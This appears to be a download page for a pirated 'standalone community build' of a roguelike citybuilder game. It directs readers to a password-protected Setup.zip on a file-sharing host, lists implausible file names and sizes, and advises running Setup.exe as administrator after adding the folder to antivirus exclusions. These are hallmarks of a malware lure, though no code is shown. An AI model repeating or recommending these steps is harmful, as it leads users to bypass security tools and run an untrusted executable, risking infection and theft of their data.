## 🎮 About the Game

Combolands: Roguelike Citybuilder combines grid-based city construction with permadeath roguelike runs. Every campaign generates a fresh terrain seed, forcing players to rebuild and adapt their settlements under escalating threats. This Community Edition is a standalone build distributed as a self-contained package: it requires no storefront, no additional software, and is ready to play immediately after installation.

This standalone Community Edition is intended for players who want a fully offline, self-contained citybuilding roguelike experience on Windows without any storefront client.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📦 Package Features

- 🏙️ **Citybuilding Core** — Zone districts, lay roads, and manage housing, food, and production chains on a tile grid.
- 🎲 **Roguelike Runs** — Permadeath campaigns where a fallen settlement ends the run and enables meta-progression.
- 🗺️ **Procedural Worlds** — Every run generates new terrain, resource distributions, and site modifiers from a shared seed system.
- 🔗 **Combo Mechanics** — Adjacent building placements trigger combo effects that boost output or enable new blueprints.
- 🧑‍🌾 **Citizen Simulation** — Settlers carry individual needs, professions, and morale that ripple through the economy.
- 🌦️ **Seasons and Disasters** — Weather cycles, droughts, and raids escalate across run stages and test settlement layout.
- 🌳 **Meta-Progression** — Completed runs grant legacy points for permanent blueprints, perks, and starting bonuses.
- 🎨 **Handcrafted Pixel Art** — Animated pixel visuals with day-night lighting and readable, zoom-friendly city views.
- 💾 **Offline Play** — Full single-player experience that runs fully offline once installed.
- 📦 **Self-Contained Package** — Ships as an independent release with no storefront client and no additional software required.
- 🌐 **Multiple Languages** — Interface localization in seven languages with full community translation support.
- 🛠️ **Mod-Friendly Files** — Plain-text configuration and data files make the build accessible for community modding.
- ⚙️ **Performance Options** — Scalable simulation detail, particle limits, and resolution settings for a range of hardware.
- 📈 **Difficulty Modes** — Relaxed, standard, and challenge presets that adjust threat pacing and economy pressure.
- 🏆 **Run Statistics** — Detailed post-run breakdowns of production, citizen losses, and milestone achievements.

- **Compression:** Lossless
- **Install Time:** ~3 minutes on SSD, ~8 minutes on HDD
- **Recoding:** none

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://gofile.io/d/kLmM81np](https://gofile.io/d/kLmM81np)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\Combolands:RoguelikeCitybuilder\Saved`

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
